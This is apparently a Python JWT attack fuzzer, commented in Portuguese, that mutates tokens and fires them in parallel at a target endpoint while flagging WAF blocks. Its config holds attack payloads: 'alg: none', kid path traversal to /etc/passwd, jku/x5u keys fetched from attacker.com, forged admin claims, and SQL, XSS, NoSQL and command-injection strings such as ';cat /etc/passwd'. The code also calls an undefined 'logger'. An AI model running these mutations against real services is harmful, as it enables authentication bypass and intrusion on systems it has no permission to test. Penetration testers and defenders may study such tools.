#!/usr/bin/env python3
"""
Fuzzing avançado de tokens JWT em endpoints.
Inclui mutação de tokens, análise de respostas, detecção de WAF, paralelização e integração com wordlists.
"""

import requests
import sys
import threading
import queue
import time
import random
import logging
from termcolor import cprint
from utils.helpers import generate_jwt_list, mutate_jwt, analyze_jwt_response
from utils.request_builder import build_headers
import base64
import json
import os
import re
from typing import Dict, List, Any, Optional, Tuple, Union

logging.basicConfig(filename='logs/fuzz_jwt.log', level=logging.INFO, format='[%(asctime)s] %(message)s')

def detect_waf(response):
    waf_signatures = [
        "cloudflare", "sucuri", "incapsula", "akamai", "mod_security", "access denied", "blocked", "waf"
    ]
    text = response.text.lower()
    return any(sig in text for sig in waf_signatures) or response.status_code in [403, 406, 429]

def advanced_fuzz_token(endpoint, tokens, threads=10, delay=0.01):
    q = queue.Queue()
    results = []
    for token in tokens:
        q.put(token)

    def worker():
        while not q.empty():
            token = q.get()
            mutated_tokens = mutate_jwt(token)
            for mtoken in mutated_tokens:
                headers = build_headers(jwt=mtoken)
                try:
                    response = requests.get(endpoint, headers=headers, timeout=10)
                    status = response.status_code
                    if detect_waf(response):
                        cprint(f"[!] WAF detectado para token: {mtoken}", "magenta")
                        logging.warning(f"WAF detectado para token: {mtoken}")
                        continue
                    analysis = analyze_jwt_response(response)
                    if analysis.get("accepted"):
                        cprint(f"[+] Token aceito: {mtoken}", "green")
                        logging.info(f"Token aceito: {mtoken}")
                        results.append({"token": mtoken, "status": status, "analysis": analysis})
                    elif analysis.get("interesting"):
                        cprint(f"[?] Resposta interessante ({status}) para token: {mtoken}", "yellow")
                        logging.info(f"Resposta interessante para token: {mtoken} - {analysis}")
                    else:
                        cprint(f"[-] Token rejeitado: {mtoken}", "red")
                        logging.info(f"Token rejeitado: {mtoken}")
                except Exception as e:
                    cprint(f"[x] Erro durante o fuzzing: {e}", "red")
                    logging.error(f"Erro durante o fuzzing: {e}")
                time.sleep(delay)
            q.task_done()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)

    q.join()
    return results

class JWTFuzzer:
    """
    Classe para realizar fuzzing inteligente em tokens JWT.
    Implementa várias estratégias de fuzzing para identificar vulnerabilidades.
    """
    
    def __init__(self, token: Optional[str] = None, config_file: Optional[str] = None):
        """
        Inicializa o JWTFuzzer com um token opcional e configurações.
        
        Args:
            token: Token JWT a ser fuzzado (opcional)
            config_file: Arquivo de configuração (opcional)
        """
        self.token = token
        self.config = self._load_config(config_file)
        self.results = []
        self.successful_payloads = []
        logger.info("JWTFuzzer inicializado")
    
    def _load_config(self, config_file: Optional[str] = None) -> Dict[str, Any]:
        """
        Carrega a configuração do fuzzer a partir de um arquivo ou usa padrões.
        
        Args:
            config_file: Caminho para o arquivo de configuração
            
        Returns:
            Dicionário com a configuração
        """
        default_config = {
            'header_mutations': {
                'alg': ['none', 'None', 'NONE', 'HS256', 'HS384', 'HS512', 'RS256', 'ES256'],
                'typ': ['JWT', 'jwt', ''],
                'kid': ['1', '0', '../../../etc/passwd', 'non_existing_key', 'file:///etc/passwd', "' OR 1=1 --"],
                'jku': ['http://attacker.com/keys.json', 'file:///etc/passwd'],
                'x5u': ['http://attacker.com/cert.pem', 'file:///etc/passwd']
            },
            'payload_mutations': {
                'admin': [True, 1, 'true', 'yes'],
                'role': ['admin', 'administrator', 'root', 'superuser'],
                'privileges': ['admin', 'all', '*'],
                'isAdmin': [True, 1, 'true', 'yes'],
                'exp': [None, 2524608000, 99999999999],  # Timestamps futuro distante
                'iat': [None, 0, 1],  # Timestamps muito antigos
                'nbf': [None, 0, 1],  # Sem restrição de "not before"
                'sub': ['admin', 'root', 'administrator', '1', '0'],
                'sql_injection': ["' OR 1=1 --", "' UNION SELECT 1,2,3 --"],
                'xss_injection': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
                'nosql_injection': ['{"$gt": ""}', '{"$ne": null}'],
                'command_injection': ['|ls', ';cat /etc/passwd', '`id`'],
                'scope': ['admin', 'admin:*', '*', 'user admin'],
                'groups': [['admin'], ['admin', 'superuser'], '*'],
                'aud': ['admin', '*', 'INTERNAL']
            },
            'signature_mutations': {
                'empty': '',
                'invalid_base64': '!@#$%^&*()',
                'zeroes': '0000000000000000000000000000000000000000000000',
                'remove_padding': True,
                'duplicate': True,
                'header_copy': True
            },
            'max_mutations': 100,
            'timeout': 30,  # segundos
            'request_delay': 0.5  # segundos
        }
        
        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Erro ao carregar arquivo de configuração: {str(e)}")
        
        return default_config
    
    def set_token(self, token: str) -> None:
        """
        Define o token JWT a ser usado para fuzzing.
        
        Args:
            token: Token JWT válido
        """
        self.token = token
        logger.info(f"Token definido: {token[:20]}...")
    
    def decode_token(self, token: Optional[str] = None) -> Dict[str, Any]:
        """
        Decodifica um token JWT sem verificar a assinatura.
        
        Args:
            token: Token JWT para decodificar (usa o token da instância se None)
            
        Returns:
            Dicionário com as partes do token
        """
        if not token:
            token = self.token
        
        if not token:
            logger.error("Nenhum token fornecido para decodificação")
            return {'error': 'Nenhum token fornecido'}
        
        try:
            # Divide o token em partes
            parts = token.split('.')
            if len(parts) < 2:
                logger.warning(f"Formato de token inválido: {token[:20]}")
                return {'error': 'Formato de token inválido'}
            
            # Função para decodificar uma parte
            def decode_part(part):
                # Adiciona padding se necessário
                padded = part + '=' * (4 - len(part) % 4) if len(part) % 4 else part
                # Decodifica base64 URL-safe
                decoded = base64.urlsafe_b64decode(padded)
                # Parse JSON
                return json.loads(decoded)
            
            # Decodifica cabeçalho e payload
            header = decode_part(parts[0])
            payload = decode_part(parts[1])
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2] if len(parts) > 2 else None,
                'raw_parts': parts
            }
            
        except Exception as e:
            logger.error(f"Erro ao decodificar token: {str(e)}")
            return {'error': str(e)}
    
    def encode_token(self, header: Dict[str, Any], payload: Dict[str, Any], 
                     signature: Optional[str] = None) -> str:
        """
        Codifica um token JWT a partir de suas partes.
        
        Args:
            header: Cabeçalho do token
            payload: Payload do token
            signature: Assinatura (opcional)
            
        Returns:
            Token JWT codificado
        """
        try:
            # Função para codificar uma parte
            def encode_part(part):
                # Converte para JSON
                json_part = json.dumps(part, separators=(',', ':'))
                # Codifica em base64 URL-safe
                encoded = base64.urlsafe_b64encode(json_part.encode()).decode()
                # Remove padding
                return encoded.rstrip('=')
            
            # Codifica cabeçalho e payload
            encoded_header = encode_part(header)
            encoded_payload = encode_part(payload)
            
            # Usa a assinatura fornecida ou a do token original
            if signature is None:
                decoded = self.decode_token()
                if 'raw_parts' in decoded and len(decoded['raw_parts']) > 2:
                    signature = decoded['raw_parts'][2]
                else:
                    signature = ''
            
            # Monta o token
            return f"{encoded_header}.{encoded_payload}.{signature}"
            
        except Exception as e:
            logger.error(f"Erro ao codificar token: {str(e)}")
            return ''
    
    def generate_mutations(self, token: Optional[str] = None, limit: int = 20) -> List[Dict[str, Any]]:
        """
        Gera mutações para o token JWT.
        
        Args:
            token: Token JWT para fuzzing (usa o token da instância se None)
            limit: Número máximo de mutações a gerar
            
        Returns:
            Lista de dicionários com informações sobre as mutações
        """
        if not token:
            token = self.token
        
        if not token:
            logger.error("Nenhum token fornecido para gerar mutações")
            return []
        
        # Decodifica o token
        decoded = self.decode_token(token)
        if 'error' in decoded:
            return []
        
        # Lista para armazenar as mutações
        mutations = []
        
        # 1. Mutações de cabeçalho
        header_mutations = self._generate_header_mutations(decoded, limit // 3)
        mutations.extend(header_mutations)
        
        # 2. Mutações de payload
        payload_mutations = self._generate_payload_mutations(decoded, limit // 3)
        mutations.extend(payload_mutations)
        
        # 3. Mutações de assinatura
        signature_mutations = self._generate_signature_mutations(decoded, limit // 3)
        mutations.extend(signature_mutations)
        
        # Limita o número de mutações
        return mutations[:limit]
    
    def _generate_header_mutations(self, decoded: Dict[str, Any], limit: int) -> List[Dict[str, Any]]:
        """
        Gera mutações no cabeçalho do token.
        
        Args:
            decoded: Token decodificado
            limit: Número máximo de mutações
            
        Returns:
            Lista de mutações
        """
        if 'header' not in decoded:
            return []
        
        mutations = []
        header = decoded['header']
        payload = decoded.get('payload', {})
        
        # Mutações do algoritmo
        for alg in self.config['header_mutations']['alg']:
            if len(mutations) >= limit:
                break
                
            mutated_header = header.copy()
            mutated_header['alg'] = alg
            
            token = self.encode_token(mutated_header, payload)
            mutations.append({
                'type': 'header',
                'field': 'alg',
                'original': header.get('alg'),
                'modified': alg,
                'token': token,
                'description': f"Alterado algoritmo para '{alg}'"
            })
        
        # Mutações de outros campos
        for field, values in self.config['header_mutations'].items():
            if field == 'alg' or len(mutations) >= limit:
                continue
                
            for value in values:
                if len(mutations) >= limit:
                    break
                    
                if field not in header or header[field] != value:
                    mutated_header = header.copy()
                    mutated_header[field] = value
                    
                    token = self.encode_token(mutated_header, payload)
                    mutations.append({
                        'type': 'header',
                        'field': field,
                        'original': header.get(field),
                        'modified': value,
                        'token': token,
                        'description': f"Alterado campo '{field}' para '{value}'"
                    })
        
        return mutations
    
    def _generate_payload_mutations(self, decoded: Dict[str, Any], limit: int) -> List[Dict[str, Any]]:
        """
        Gera mutações no payload do token.
        
        Args:
            decoded: Token decodificado
            limit: Número máximo de mutações
            
        Returns:
            Lista de mutações
        """
        if 'payload' not in decoded:
            return []
        
        mutations = []
        header = decoded.get('header', {})
        payload = decoded['payload']
        
        # Mutações de campos de privilégio
        privilege_fields = ['admin', 'role', 'privileges', 'isAdmin', 'scope', 'groups']
        
        for field in privilege_fields:
            if len(mutations) >= limit:
                break
                
            for value in self.config['payload_mutations'].get(field, []):
                if len(mutations) >= limit:
                    break
                    
                if field not in payload or payload[field] != value:
                    mutated_payload = payload.copy()
                    mutated_payload[field] = value
                    
                    token = self.encode_token(header, mutated_payload)
                    mutations.append({
                        'type': 'payload',
                        'field': field,
                        'original': payload.get(field),
                        'modified': value,
                        'token': token,
                        'description': f"Adicionado/modificado campo '{field}' para '{value}'"
                    })
        
        # Mutações de carimbos de tempo
        timestamp_fields = ['exp', 'iat', 'nbf']
        
        for field in timestamp_fields:
            if len(mutations) >= limit:
                break
                
            for value in self.config['payload_mutations'].get(field, []):
                if len(mutations) >= limit:
                    break
                    
                if field in payload and value is None:
                    # Remove o campo
                    mutated_payload = payload.copy()
                    del mutated_payload[field]
                    
                    token = self.encode_token(header, mutated_payload)
                    mutations.append({
                        'type': 'payload',
                        'field': field,
                        'original': payload.get(field),
                        'modified': 'REMOVED',
                        'token': token,
                        'description': f"Removido campo '{field}'"
                    })
                elif field not in payload or payload[field] != value:
                    if value is not None:  # Não adiciona None
                        mutated_payload = payload.copy()
                        mutated_payload[field] = value
                        
                        token = self.encode_token(header, mutated_payload)
                        mutations.append({
                            'type': 'payload',
                            'field': field,
                            'original': payload.get(field),
                            'modified': value,
                            'token': token,
                            'description': f"Alterado carimbo de tempo '{field}' para '{value}'"
                        })
        
        # Adicionar campos de injeção
        injection_fields = ['sql_injection', 'xss_injection', 'nosql_injection', 'command_injection']
        
        for field_type in injection_fields:
            if len(mutations) >= limit:
                break
                
            for payload_value in self.config['payload_mutations'].get(field_type, []):
                if len(mutations) >= limit:
                    break
                
                # Tenta injetar em campos existentes
                for existing_field in payload:
                    if len(mutations) >= limit:
                        break
                        
                    mutated_payload = payload.copy()
                    mutated_payload[existing_field] = payload_value
                    
                    token = self.encode_token(header, mutated_payload)
                    mutations.append({
                        'type': 'payload_injection',
                        'field': existing_field,
                        'original': payload.get(existing_field),
                        'modified': payload_value,
                        'token': token,
                        'description': f"Injetado '{field_type}' no campo '{existing_field}'"
                    })
                
                # Também adiciona como um novo campo
                field_name = f"test_{field_type.split('_')[0]}"
                mutated_payload = payload.copy()
                mutated_payload[field_name] = payload_value
                
                token = self.encode_token(header, mutated_payload)
                mutations.append({
                    'type': 'payload_injection',
                    'field': field_name,
                    'original': None,
                    'modified': payload_value,
                    'token': token,
                    'description': f"Adicionado novo campo '{field_name}' com injeção '{field_type}'"
                })
        
        return mutations
    
    def _generate_signature_mutations(self, decoded: Dict[str, Any], limit: int) -> List[Dict[str, Any]]:
        """
        Gera mutações na assinatura do token.
        
        Args:
            decoded: Token decodificado
            limit: Número máximo de mutações
            
        Returns:
            Lista de mutações
        """
        if 'signature' not in decoded or not decoded['signature']:
            return []
        
        mutations = []
        header = decoded.get('header', {})
        payload = decoded.get('payload', {})
        signature = decoded['signature']
        
        # Assinatura vazia
        if len(mutations) < limit:
            token = f"{decoded['raw_parts'][0]}.{decoded['raw_parts'][1]}."
            mutations.append({
                'type': 'signature',
                'field': 'empty',
                'original': signature,
                'modified': '',
                'token': token,
                'description': "Assinatura removida (vazia)"
            })
        
        # Assinatura inválida (caracteres especiais)
        if len(mutations) < limit:
            invalid_sig = self.config['signature_mutations']['invalid_base64']
            token = f"{decoded['raw_parts'][0]}.{decoded['raw_parts'][1]}.{invalid_sig}"
            mutations.append({
                'type': 'signature',
                'field': 'invalid_base64',
                'original': signature,
                'modified': invalid_sig,
                'token': token,
                'description': "Assinatura substituída por caracteres inválidos"
            })
        
        # Assinatura de zeros
        if len(mutations) < limit:
            zeroes = self.config['signature_mutations']['zeroes']
            token = f"{decoded['raw_parts'][0]}.{decoded['raw_parts'][1]}.{zeroes}"
            mutations.append({
                'type': 'signature',
                'field': 'zeroes',
                'original': signature,
                'modified': zeroes,
                'token': token,
                'description': "Assinatura substituída por zeros"
            })
        
        # Duplicação da assinatura
        if len(mutations) < limit and self.config['signature_mutations'].get('duplicate', False):
            duplicated = signature + signature
            token = f"{decoded['raw_parts'][0]}.{decoded['raw_parts'][1]}.{duplicated}"
            mutations.append({
                'type': 'signature',
                'field': 'duplicate',
                'original': signature,
                'modified': duplicated,
                'token': token,
                'description': "Assinatura duplicada"
            })
        
        # Cópia do cabeçalho como assinatura
        if len(mutations) < limit and self.config['signature_mutations'].get('header_copy', False):
            token = f"{decoded['raw_parts'][0]}.{decoded['raw_parts'][1]}.{decoded['raw_parts'][0]}"
            mutations.append({
                'type': 'signature',
                'field': 'header_copy',
                'original': signature,
                'modified': decoded['raw_parts'][0],
                'token': token,
                'description': "Cabeçalho usado como assinatura"
            })
        
        return mutations
    
    def fuzz_token(self, token: Optional[str] = None, callback: Optional[callable] = None) -> Dict[str, Any]:
        """
        Realiza fuzzing completo em um token JWT.
        
        Args:
            token: Token JWT para fuzzing (usa o token da instância se None)
            callback: Função de callback para testar cada mutação
            
        Returns:
            Resultados do fuzzing
        """
        if not token:
            token = self.token
        
        if not token:
            logger.error("Nenhum token fornecido para fuzzing")
            return {'error': 'Nenhum token fornecido'}
        
        if not callback:
            logger.error("Nenhuma função de callback fornecida para testar as mutações")
            return {'error': 'Função de callback obrigatória'}
        
        logger.info(f"Iniciando fuzzing no token: {token[:20]}...")
        
        # Gera mutações
        mutations = self.generate_mutations(token, self.config.get('max_mutations', 100))
        
        if not mutations:
            logger.warning("Nenhuma mutação gerada")
            return {'error': 'Nenhuma mutação gerada'}
        
        logger.info(f"Geradas {len(mutations)} mutações")
        
        # Testa cada mutação
        results = []
        successful = []
        
        for i, mutation in enumerate(mutations):
            logger.info(f"Testando mutação {i+1}/{len(mutations)}: {mutation['description']}")
            
            # Chama a função de callback para testar a mutação
            result = callback(mutation['token'], mutation)
            
            # Adiciona metadados ao resultado
            result['mutation'] = mutation
            results.append(result)
            
            # Verifica se a mutação foi bem-sucedida
            if result.get('success', False):
                logger.info(f"Mutação bem-sucedida: {mutation['description']}")
                successful.append(mutation)
            
            # Espera um pouco para não sobrecarregar o servidor
            time.sleep(self.config.get('request_delay', 0.5))
        
        # Armazena resultados
        self.results = results
        self.successful_payloads = successful
        
        return {
            'token': token,
            'mutations_tested': len(mutations),
            'successful_mutations': len(successful),
            'results': results,
            'successful_payloads': successful
        }
    
    def get_results(self) -> Dict[str, Any]:
        """
        Retorna os resultados do último fuzzing.
        
        Returns:
            Resultados do fuzzing
        """
        return {
            'results': self.results,
            'successful_payloads': self.successful_payloads,
            'count': len(self.results),
            'success_count': len(self.successful_payloads)
        }
    
    def save_results(self, filename: str) -> bool:
        """
        Salva os resultados do fuzzing em um arquivo.
        
        Args:
            filename: Nome do arquivo para salvar
            
        Returns:
            True se salvou com sucesso, False caso contrário
        """
        try:
            results = self.get_results()
            
            with open(filename, 'w') as f:
                json.dump(results, f, indent=4)
            
            logger.info(f"Resultados salvos em: {filename}")
            return True
        except Exception as e:
            logger.error(f"Erro ao salvar resultados: {str(e)}")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        cprint("Uso: python3 fuzz_jwt.py http://alvo.com/endpoint path/para/wordlist.txt", "red")
        sys.exit(1)

    endpoint = sys.argv[1]
    wordlist_path = sys.argv[2]

    try:
        with open(wordlist_path, "r") as f:
            tokens = [line.strip() for line in f.readlines() if line.strip()]
    except Exception as e:
        cprint(f"[x] Erro ao ler wordlist: {e}", "red")
        sys.exit(1)

    cprint(f"[+] Iniciando fuzzing avançado em {endpoint} com {len(tokens)} tokens...", "cyan")
    results = advanced_fuzz_token(endpoint, tokens, threads=16, delay=0.005)
    cprint(f"[+] Fuzzing concluído. Tokens aceitos/interessantes: {len(results)}", "cyan")
    if results:
        with open("output/fuzz_jwt_results.json", "w", encoding="utf-8") as out:
            import json
            json.dump(results, out, indent=2)
        cprint("[+] Resultados salvos em output/fuzz_jwt_results.json", "green")